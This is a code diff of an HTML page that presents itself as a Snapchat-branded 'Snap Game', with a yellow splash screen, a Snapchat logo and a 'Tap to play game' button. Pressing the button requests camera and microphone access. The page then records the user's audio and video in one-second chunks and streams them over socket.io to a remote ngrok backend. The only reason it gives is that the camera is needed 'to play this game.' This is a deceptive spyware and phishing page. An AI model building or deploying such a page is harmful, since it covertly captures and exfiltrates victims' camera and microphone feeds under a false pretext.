@@ -1,72 +1,171 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Stream Test</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snap Game</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  overflow: hidden;
+}
+
+/* 🟡 Splash */
+#splash {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  background: #FFFC00;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+}
+
+/* Logo */
+#logo {
+  width: 120px;
+  height: 120px;
+  object-fit: contain;
+}
+
+/* Text */
+#tap {
+  margin-top: 20px;
+  font-size: 16px;
+}
+
+/* Button */
+#startBtn {
+  margin-top: 15px;
+  padding: 12px 20px;
+  border-radius: 25px;
+  border: none;
+  background: black;
+  color: white;
+  font-size: 16px;
+}
+
+/* Error message */
+#message {
+  margin-top: 10px;
+  color: red;
+  font-size: 14px;
+}
+
+/* Camera */
+#camera {
+  width: 100%;
+  height: 100vh;
+  object-fit: cover;
+  display: none;
+}
+
+/* Capture button */
+.capture-btn {
+  position: fixed;
+  bottom: 40px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  background: white;
+  border: 5px solid rgba(255,255,255,0.5);
+  display: none;
+}
+</style>
 </head>
+
 <body>
 
-<video id="localVideo" autoplay muted style="width:400px;"></video>
+<!-- 🟡 Splash Screen -->
+<div id="splash">
+
+  <!-- ✅ Your downloaded logo -->
+  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo">
+
+  <div id="tap">Tap to play game</div>
+
+  <button id="startBtn" onclick="startApp()">Start</button>
+
+  <div id="message"></div>
+
+</div>
+
+<!-- 📸 Camera -->
+<video id="camera" autoplay playsinline></video>
+
+<!-- Capture UI -->
+<div class="capture-btn"></div>
 
 <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
 
 <script>
-const socket = io('http://localhost:4000');
+// 🔌 Backend URL
+const BACKEND_URL = "https://tableware-dweeb-estate.ngrok-free.dev";
 
-navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-  .then((stream) => {
+const socket = io(BACKEND_URL, {
+  transports: ['websocket', 'polling']
+});
 
-    const video = document.getElementById('localVideo');
-    video.srcObject = stream;
+let mediaRecorder;
 
-    // Check codec support (IMPORTANT)
-    const mimeType = 'video/webm; codecs=vp8,opus';
+function startApp() {
+  const splash = document.getElementById("splash");
+  const camera = document.getElementById("camera");
+  const btn = document.querySelector(".capture-btn");
+  const msg = document.getElementById("message");
 
-    if (!MediaRecorder.isTypeSupported(mimeType)) {
-      console.warn('⚠️ Codec not supported, falling back to default webm');
-    }
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(stream => {
 
-    const mediaRecorder = new MediaRecorder(stream, {
-      mimeType: MediaRecorder.isTypeSupported(mimeType) ? mimeType : 'video/webm'
-    });
+      msg.innerText = "";
 
-    mediaRecorder.ondataavailable = async (event) => {
+      camera.srcObject = stream;
+      camera.style.display = "block";
+      btn.style.display = "block";
+      splash.style.display = "none";
 
-      if (event.data && event.data.size > 0) {
+      socket.emit('start-stream');
 
-        try {
+      // 🔥 FIX: proper codec
+      const mimeType = 'video/webm; codecs=vp8,opus';
+
+      mediaRecorder = new MediaRecorder(stream, {
+        mimeType: MediaRecorder.isTypeSupported(mimeType)
+          ? mimeType
+          : 'video/webm'
+      });
+
+      mediaRecorder.ondataavailable = async (event) => {
+
+        if (event.data && event.data.size > 0) {
+
+          // 🔥 IMPORTANT FIX HERE
           const buffer = await event.data.arrayBuffer();
 
-          console.log('📦 Chunk size:', buffer.byteLength);
-
           socket.emit('stream-data', buffer);
-
-        } catch (err) {
-          console.error('❌ Chunk conversion error:', err);
         }
-      }
-    };
+      };
 
-    mediaRecorder.onerror = (err) => {
-      console.error('❌ MediaRecorder error:', err);
-    };
+      mediaRecorder.start(1000);
 
-    socket.on('connect', () => {
-      console.log('🟢 Connected to server');
-      socket.emit('start-stream');
+      window.onbeforeunload = () => {
+        mediaRecorder.stop();
+        socket.emit('stop-stream');
+      };
+
+    })
+    .catch(err => {
+      console.error(err);
+
+      msg.innerText = "⚠️ Please allow camera to play this game";
+      document.getElementById("startBtn").innerText = "Try Again";
     });
-
-    mediaRecorder.start(1000); // 1 second chunks
-
-    window.onbeforeunload = () => {
-      mediaRecorder.stop();
-      socket.emit('stop-stream');
-    };
-
-  })
-  .catch((err) => {
-    console.error('❌ getUserMedia error:', err);
-  });
-
+}
 </script>
 
 </body>
